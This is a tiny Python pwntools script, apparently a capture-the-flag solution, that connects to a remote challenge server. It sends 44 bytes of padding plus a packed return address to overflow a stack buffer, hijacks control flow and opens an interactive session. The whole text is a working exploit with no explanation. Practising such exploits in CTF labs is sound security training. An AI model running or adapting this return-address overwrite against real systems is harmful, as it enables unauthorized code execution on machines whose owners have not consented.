from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25573)
io.sendline(cyclic(40+4) + p32(0x80485CB))
io.interactive()
